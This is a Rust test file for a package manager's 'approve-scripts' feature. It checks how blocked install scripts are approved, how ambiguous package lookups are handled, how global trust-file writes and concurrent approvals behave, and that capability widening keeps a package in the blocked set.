// emit_yes_warning_banner must NOT call tracing::warn! / println!.
// The CLI-level test (driving the binary as a subprocess) is the
// end-to-end gate — see lpm-cli/tests/approve_scripts_cli.rs.

#[tokio::test]
async fn approve_scripts_yes_json_emits_warning_only_in_json_warnings_field() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

    // --yes --json — verify the manifest mutation lands AND the
    // structured warning is in the JSON warnings array. The full
    // stdout-purity test is at the CLI level (subprocess capture).
    run(dir.path(), None, true, false, false, true)
        .await
        .unwrap();

    let after = read_manifest(&dir.path().join("package.json"));
    assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
    // The function should have completed without panicking. The
    // CLI-level subprocess test verifies the stdout layer.
}

// ─── approve-scripts --global ───────────────────────────────

use crate::build_state::compute_blocked_set_fingerprint;
use crate::global_blocked_set::{AggregateBlockedRow, AggregateBlockedSet};
use chrono::Utc;
use lpm_global::{GlobalManifest, PackageEntry, PackageSource};

fn scoped_lpm_home(path: &Path) -> crate::test_env::ScopedEnv {
    crate::test_env::ScopedEnv::set([("LPM_HOME", path.as_os_str().to_owned())])
}

fn row(name: &str, version: &str, origins: &[&str]) -> AggregateBlockedRow {
    AggregateBlockedRow {
        name: name.into(),
        version: version.into(),
        integrity: Some(format!("sha512-{name}{version}")),
        script_hash: Some(format!("sha256-{name}{version}")),
        phases_present: vec!["postinstall".into()],
        binding_drift: false,
        // Default to None tier — legacy / pre-classification state.
        // Tests that exercise the global tier gate construct rows
        // with an explicit tier via [`row_tiered`] below.
        static_tier: None,
        origins: origins.iter().map(|s| (*s).to_string()).collect(),
    }
}

fn deny_verify_policy() -> VerifyPolicy {
    VerifyPolicy {
        enforce: EnforceMode::Deny,
        skip: SkipPolicy::None,
    }
}

fn seed_global_manifest_with_blocked(
    root: &lpm_common::LpmRoot,
    top_level: &str,
    top_level_version: &str,
    blocked_rows: Vec<AggregateBlockedRow>,
) {
    let rel_root = format!("installs/{}@{}", top_level, top_level_version);
    let install_root = root.global_root().join(&rel_root);
    std::fs::create_dir_all(&install_root).unwrap();

    let blocked_packages: Vec<crate::build_state::BlockedPackage> = blocked_rows
        .into_iter()
        .map(|row| crate::build_state::BlockedPackage {
            name: row.name,
            version: row.version,
            integrity: row.integrity,
            script_hash: row.script_hash,
            phases_present: row.phases_present,
            binding_drift: row.binding_drift,
            // fields default to None when constructing
            // from the `ApproveRow` test helper. The row type
            // doesn't carry tier/provenance/etc. yet; when later
            // phases need them, extend `ApproveRow` in lockstep.
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        })
        .collect();

    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: compute_blocked_set_fingerprint(&blocked_packages),
        captured_at: Utc::now().to_rfc3339(),
        blocked_packages,
        drift_ignore_override: None,
    };
    crate::build_state::write_build_state(&install_root, &state).unwrap();

    let mut manifest = GlobalManifest::default();
    manifest.packages.insert(
        top_level.into(),
        PackageEntry {
            saved_spec: "^1".into(),
            resolved: top_level_version.into(),
            integrity: "sha512-top-level".into(),
            source: PackageSource::UpstreamNpm,
            installed_at: Utc::now(),
            root: rel_root,
            commands: vec![],
        },
    );
    lpm_global::write_for(root, &manifest).unwrap();
}

#[test]
fn lookup_aggregate_by_arg_matches_bare_name_when_unique() {
    let rows = vec![row("esbuild", "0.25.1", &["eslint"])];
    let hit = match lookup_aggregate_by_arg(&rows, "esbuild") {
        AggregateLookup::Match(r) => r,
        other => panic!("expected Match, got {other:?}"),
    };
    assert_eq!(hit.name, "esbuild");
}

#[test]
fn lookup_aggregate_by_arg_matches_name_at_version() {
    let rows = vec![
        row("esbuild", "0.25.1", &["eslint"]),
        row("esbuild", "0.25.2", &["typescript"]),
    ];
    let hit = match lookup_aggregate_by_arg(&rows, "esbuild@0.25.2") {
        AggregateLookup::Match(r) => r,
        other => panic!("expected Match, got {other:?}"),
    };
    assert_eq!(hit.version, "0.25.2");
}

#[test]
fn lookup_aggregate_by_arg_returns_notfound_for_unknown_name() {
    let rows = vec![row("esbuild", "0.25.1", &["eslint"])];
    assert!(matches!(
        lookup_aggregate_by_arg(&rows, "ghost"),
        AggregateLookup::NotFound
    ));
}

/// Bare-name lookup against a rows set where two versions exist for the
/// same name MUST return Ambiguous, not silently take the first. A
/// first-match lookup would let `lpm approve-scripts --global esbuild`
/// approve the wrong version binding without any feedback.
#[test]
fn lookup_aggregate_by_arg_is_ambiguous_when_bare_name_matches_multiple_versions() {
    let rows = vec![
        row("esbuild", "0.25.1", &["eslint"]),
        row("esbuild", "0.25.2", &["typescript"]),
    ];
    match lookup_aggregate_by_arg(&rows, "esbuild") {
        AggregateLookup::Ambiguous { candidates } => {
            assert_eq!(candidates.len(), 2);
        }
        other => panic!(
            "expected Ambiguous — bare `esbuild` matches two versions, \
                 got {other:?}"
        ),
    }
}

/// name@version CAN be ambiguous too: two install roots that contain
/// the same `name@version` but with different (integrity, script_hash)
/// bindings (e.g., tarball swap between installs) produce two
/// aggregate rows per the dedup rule. User MUST disambiguate; silent
/// first-match would approve the wrong binding.
#[test]
fn lookup_aggregate_by_arg_is_ambiguous_when_name_at_version_matches_multiple_bindings() {
    let mut a = row("esbuild", "0.25.1", &["eslint"]);
    a.integrity = Some("sha512-A".into());
    let mut b = row("esbuild", "0.25.1", &["typescript"]);
    b.integrity = Some("sha512-B".into());
    let rows = vec![a, b];
    match lookup_aggregate_by_arg(&rows, "esbuild@0.25.1") {
        AggregateLookup::Ambiguous { candidates } => {
            assert_eq!(candidates.len(), 2);
        }
        other => panic!("expected Ambiguous across distinct bindings: {other:?}"),
    }
}

#[test]
fn group_remaining_rows_by_origin_omits_rows_already_decided_everywhere() {
    let shared = row("esbuild", "0.25.1", &["eslint", "typescript"]);
    let unique = row("sharp", "0.33.0", &["typescript"]);
    let agg = AggregateBlockedSet {
        rows: vec![shared.clone(), unique],
        unreadable_origins: vec![],
    };
    let mut decided = std::collections::HashSet::new();
    decided.insert(AggregateRowKey::from_row(&shared));

    let grouped = group_remaining_rows_by_origin(&agg, &decided);
    assert!(!grouped.contains_key("eslint"));
    let ts_rows = grouped
        .get("typescript")
        .expect("typescript should still have remaining rows");
    assert_eq!(ts_rows.len(), 1);
    assert_eq!(ts_rows[0].name, "sharp");
}

/// End-to-end: `run_global_named` surfaces the ambiguity as a
/// Script error whose message names all candidates so the user
/// can re-run with a disambiguating `name@version`.
#[tokio::test]
async fn run_global_named_surfaces_bare_name_ambiguity_with_candidates() {
    let tmp = tempdir().unwrap();
    let root = lpm_common::LpmRoot::from_dir(tmp.path());
    let agg = AggregateBlockedSet {
        rows: vec![
            row("esbuild", "0.25.1", &["eslint"]),
            row("esbuild", "0.25.2", &["typescript"]),
        ],
        unreadable_origins: vec![],
    };
    let policy = deny_verify_policy();
    let err = run_global_named(
        &root,
        &agg,
        "esbuild",
        false,
        true,
        &policy,
        EnforceMode::Deny,
    )
    .await
    .unwrap_err();
    let msg = err.to_string();
    assert!(msg.contains("ambiguous"), "error must say ambiguous: {msg}");
    assert!(
        msg.contains("esbuild@0.25.1") && msg.contains("esbuild@0.25.2"),
        "error must list both candidates so the user can disambiguate: {msg}"
    );
    // Trust file must NOT have been written on ambiguity — no
    // row was approved.
    let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
    assert!(trust.trusted.is_empty(), "no writes on ambiguity");
}

/// --list (read-only) with the default group setting renders every
/// row once with its origin list. Flat shape; each row shows
/// `name @ version — used by A, B`.
#[test]
fn print_global_list_handles_empty_aggregate_without_panicking() {
    let agg = AggregateBlockedSet::default();
    // (group, dry_run, json_output) — exercise the four
    // `(group × json)` shapes twice: once with dry_run=false,
    // once with dry_run=true. Smoke test that neither signal
    // panics the empty-aggregate branch.
    print_global_list(&agg, false, false, false);
    print_global_list(&agg, true, false, false);
    print_global_list(&agg, false, false, true);
    print_global_list(&agg, false, true, true);
}

#[test]
fn rerun_next_steps_json_returns_reinstall_commands_for_global_origins() {
    let origins = vec!["eslint".to_string(), "typescript".to_string()];
    let steps = global::rerun_next_steps_json(&origins);
    let steps = steps.as_array().expect("next_steps must be an array");

    assert_eq!(steps.len(), 2);
    assert_eq!(
        steps[0]["command"].as_str(),
        Some("lpm uninstall -g eslint && lpm install -g eslint")
    );
    assert_eq!(
        steps[1]["command"].as_str(),
        Some("lpm uninstall -g typescript && lpm install -g typescript")
    );
}

/// `--yes` writes every aggregate row into the global trust file
/// AND surfaces a `warnings` entry in JSON mode so agents can
/// detect bulk-approval flows.
#[tokio::test]
async fn run_global_bulk_yes_writes_each_row_to_trust_file() {
    let _security_backend = ensure_security_test_backend();
    let tmp = tempdir().unwrap();
    let root = lpm_common::LpmRoot::from_dir(tmp.path());
    let agg = AggregateBlockedSet {
        rows: vec![
            row("esbuild", "0.25.1", &["eslint"]),
            row("sharp", "0.33.0", &["typescript"]),
        ],
        unreadable_origins: vec![],
    };
    // JSON mode so no interactive prompts and output goes to stdout.
    let policy = deny_verify_policy();
    run_global_bulk_yes(&root, &agg, false, true, &policy, EnforceMode::Deny)
        .await
        .unwrap();
    let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
    assert!(trust.trusted.contains_key("esbuild@0.25.1"));
    assert!(trust.trusted.contains_key("sharp@0.33.0"));
}

/// Named-package approval writes exactly ONE entry to the trust
/// file, leaving other rows unapproved.
#[tokio::test]
async fn run_global_named_approves_only_the_matched_row() {
    let _security_backend = ensure_security_test_backend();
    let tmp = tempdir().unwrap();
    let root = lpm_common::LpmRoot::from_dir(tmp.path());
    let agg = AggregateBlockedSet {
        rows: vec![
            row("esbuild", "0.25.1", &["eslint"]),
            row("sharp", "0.33.0", &["typescript"]),
        ],
        unreadable_origins: vec![],
    };
    let policy = deny_verify_policy();
    run_global_named(
        &root,
        &agg,
        "sharp",
        false,
        true,
        &policy,
        EnforceMode::Deny,
    )
    .await
    .unwrap();
    let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
    assert!(trust.trusted.contains_key("sharp@0.33.0"));
    assert!(!trust.trusted.contains_key("esbuild@0.25.1"));
}

/// Unknown package name surfaces NotFound with an actionable hint
/// pointing at `--list`.
#[tokio::test]
async fn run_global_named_errors_for_unknown_package() {
    let tmp = tempdir().unwrap();
    let root = lpm_common::LpmRoot::from_dir(tmp.path());
    let agg = AggregateBlockedSet {
        rows: vec![row("esbuild", "0.25.1", &["eslint"])],
        unreadable_origins: vec![],
    };
    let policy = deny_verify_policy();
    let err = run_global_named(
        &root,
        &agg,
        "ghost",
        false,
        true,
        &policy,
        EnforceMode::Deny,
    )
    .await
    .unwrap_err();
    let msg = err.to_string();
    assert!(msg.contains("not in the global blocked set"));
    assert!(msg.contains("--global --list"));
}

/// `--list --yes` together are rejected with the same error shape
/// as the project-scoped flow.
#[tokio::test]
async fn run_global_rejects_list_plus_yes() {
    let tmp = std::env::temp_dir();
    let _env = scoped_lpm_home(&tmp);
    let err = run_global(None, true, true, false, false, true)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("conflicts with `--yes`"));
}

#[tokio::test]
async fn run_global_grouped_interactive_path_is_reachable() {
    let tmp = tempdir().unwrap();
    let root = lpm_common::LpmRoot::from_dir(tmp.path());
    seed_global_manifest_with_blocked(
        &root,
        "eslint",
        "9.24.0",
        vec![row("esbuild", "0.25.1", &["eslint"])],
    );
    let _env = scoped_lpm_home(tmp.path());
    let err = run_global(None, false, false, true, false, true)
        .await
        .unwrap_err();
    let msg = err.to_string();
    assert!(msg.contains("needs a TTY for the interactive walk"));
}

/// --group auto-enable threshold constant is at the expected value.
/// Pin it so a future refactor doesn't accidentally change the
/// threshold without the plan doc being updated.
#[test]
fn group_auto_threshold_is_10() {
    assert_eq!(GROUP_AUTO_THRESHOLD, 10);
}

// ─── — interactive choice mapping ─────────
//
// The Select itself can't be unit-tested without driving cliclack
// (which expects a TTY); these tests pin the pure decision
// projection that the Select callback feeds into. The actual TUI
// wiring is exercised end-to-end by the C5 reference fixture.

#[test]
fn interactive_choice_decision_maps_approve_pair_to_true() {
    assert_eq!(InteractiveChoice::Approve.decision(), Some(true));
    assert_eq!(InteractiveChoice::AcceptNew.decision(), Some(true));
}

#[test]
fn interactive_choice_decision_maps_skip_pair_to_false() {
    assert_eq!(InteractiveChoice::Skip.decision(), Some(false));
    assert_eq!(InteractiveChoice::KeepOld.decision(), Some(false));
}

#[test]
fn interactive_choice_decision_returns_none_for_view_and_quit() {
    assert_eq!(InteractiveChoice::View.decision(), None);
    assert_eq!(InteractiveChoice::Quit.decision(), None);
}

#[test]
fn keep_old_choice_does_not_imply_approve() {
    // Pin the signoff-B(i) contract: KeepOld is decline, not a
    // resolver mutation. If a future refactor accidentally
    // remaps KeepOld to true (e.g., trying to "remember" the old
    // approval somehow writes a new binding), this test fails.
    assert_eq!(
        InteractiveChoice::KeepOld.decision(),
        Some(false),
        "KeepOld must collapse to decline (false), NEVER approve. \
             Per signoff B(i): no resolver pin, no manifest write."
    );
}

// ── capability-widening
//    must flow through `compute_effective_blocked_set` ──

/// The discovery-side filter must not drop strict-matched rows when the
/// capability request has widened. The filter consults the capability
/// gate, so a strict-matched package whose current capability request
/// widens stays in the effective blocked set for `lpm approve-scripts`
/// to surface.
#[test]
fn capability_widening_row_stays_in_effective_blocked_set() {
    use crate::capability::{CapabilitySet, ReadProjectMode, UserBound};

    let state = BuildState {
        state_version: build_state::BUILD_STATE_VERSION,
        blocked_set_fingerprint: "fp".into(),
        captured_at: "T00:00:00Z".into(),
        blocked_packages: vec![BlockedPackage {
            name: "esbuild".into(),
            version: "0.25.1".into(),
            integrity: None,
            script_hash: Some("sha256-h".into()),
            phases_present: vec!["postinstall".into()],
            binding_drift: true, // capture wrote this with drift flag
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        }],
        drift_ignore_override: None,
    };
    // Strict match: script-hash approved with no capability_hash.
    let mut map = std::collections::HashMap::new();
    map.insert(
        "esbuild@0.25.1".to_string(),
        TrustedDependencyBinding {
            script_hash: Some("sha256-h".into()),
            ..Default::default()
        },
    );
    let trusted = TrustedDependencies::Rich(map);

    // Capability request widens (non-empty passEnv).
    let widening = CapabilitySet {
        pass_env: ["SSH_AUTH_SOCK".into()].into_iter().collect(),
        read_project: ReadProjectMode::Narrow,
        sandbox_limits: Default::default(),
    };

    let effective =
        compute_effective_blocked_set(&state, &trusted, &widening, &UserBound::default());
    assert_eq!(
        effective.len(),
        1,
        "capability-widening package must stay in effective \
             blocked set so approve-scripts can surface it"
    );
    assert_eq!(effective[0].name, "esbuild");
}

/// Parity: a baseline request against a strict-matched
/// package drops from the effective set (no regression for
/// the common case). Pre-6d behavior preserved for baseline.
#[test]
fn baseline_request_drops_strict_matched_row() {
    use crate::capability::{CapabilitySet, UserBound};

    let state = BuildState {
        state_version: build_state::BUILD_STATE_VERSION,
        blocked_set_fingerprint: "fp".into(),
        captured_at: "T00:00:00Z".into(),
        blocked_packages: vec![BlockedPackage {
            name: "esbuild".into(),
            version: "0.25.1".into(),
            integrity: None,
            script_hash: Some("sha256-h".into()),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        }],
        drift_ignore_override: None,
    };
    let mut map = std::collections::HashMap::new();
    map.insert(
        "esbuild@0.25.1".to_string(),
        TrustedDependencyBinding {
            script_hash: Some("sha256-h".into()),
            ..Default::default()
        },
    );
    let trusted = TrustedDependencies::Rich(map);

    let effective = compute_effective_blocked_set(
        &state,
        &trusted,
        &CapabilitySet::default(),
        &UserBound::default(),
    );
    assert!(
        effective.is_empty(),
        "strict-matched + baseline request → filtered out"
    );
}

// ─── provenance + tx-lock + origin-aware banner ────────

// End-to-end provenance persistence (cache hit → binding has
// populated `provenance_at_approval`) lives in the workflow tests
// under tests/workflows/tests/install_global_drift.rs, where a mock
// registry can declare `dist.attestations.url` so the cache is
// actually consulted. In-process unit tests can't easily reach that
// path because the cache is bypassed when registry metadata reports
// no attestation URL (and the unit-test environment has no network /
// no mock to declare one). The schema round-trip and binding-shape
// dimensions of provenance persistence are pinned by:
//   - `crates/lpm-global/src/trusted_deps.rs::tests::round_trip_preserves_provenance_at_approval`
//   - `crates/lpm-global/src/trusted_deps.rs::tests::insert_binding_stores_rich_binding_and_overwrites`

/// Two parallel `--global` named approvals against DISJOINT rows must
/// both land in the final trust file. The shared `store_lock` allows
/// concurrent readers, so the write path also needs
/// `with_exclusive_lock_async(global_tx_lock())` to serialize updates.
///
/// Disjoint approvals (esbuild vs sharp) — not `--yes` against
/// identical sets — force a non-overlapping insert pattern so a
/// silent clobber is observable as a missing binding.
#[tokio::test]
async fn global_named_approvals_do_not_clobber_each_other() {
    let tmp = tempdir().unwrap();
    let _env = scoped_lpm_home_with_security(tmp.path());
    let root_path = tmp.path().to_path_buf();
    let agg = AggregateBlockedSet {
        rows: vec![
            row("esbuild", "0.25.1", &["eslint"]),
            row("sharp", "0.33.0", &["typescript"]),
        ],
        unreadable_origins: vec![],
    };
    let agg_a = agg.clone();
    let agg_b = agg.clone();
    let root_a = root_path.clone();
    let root_b = root_path.clone();
    let task_a = tokio::spawn(async move {
        let root = lpm_common::LpmRoot::from_dir(&root_a);
        let policy = deny_verify_policy();
        run_global_named(
            &root,
            &agg_a,
            "esbuild@0.25.1",
            false,
            true,
            &policy,
            EnforceMode::Deny,
        )
        .await
    });
    let task_b = tokio::spawn(async move {
        let root = lpm_common::LpmRoot::from_dir(&root_b);
        let policy = deny_verify_policy();
        run_global_named(
            &root,
            &agg_b,
            "sharp@0.33.0",
            false,
            true,
            &policy,
            EnforceMode::Deny,
        )
        .await
    });
    task_a.await.unwrap().unwrap();
    task_b.await.unwrap().unwrap();
    let root = lpm_common::LpmRoot::from_dir(&root_path);
    let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
    assert!(
        trust.trusted.contains_key("esbuild@0.25.1"),
        "first writer's binding survived",
    );
    assert!(
        trust.trusted.contains_key("sharp@0.33.0"),
        "second writer's binding survived",
    );
}

/// Origin-list helpers: empty-origins fallback + single-origin
/// rendering + multi-origin sorted-deduped union.
#[test]
fn union_origins_sorts_and_deduplicates() {
    let rows = [
        row("esbuild", "0.25.1", &["vite-plugin-foo", "eslint"]),
        row("sharp", "0.33.0", &["eslint", "typescript"]),
    ];
    let origins = union_origins(rows.iter());
    assert_eq!(origins, vec!["eslint", "typescript", "vite-plugin-foo"]);
}

#[test]
fn rerun_next_step_json_shape_is_stable() {
    let payload = rerun_next_step_json(&["eslint".into(), "typescript".into()]);
    assert_eq!(payload["kind"], "reinstall_globals");
    assert_eq!(payload["origins"][0], "eslint");
    assert_eq!(payload["origins"][1], "typescript");
}
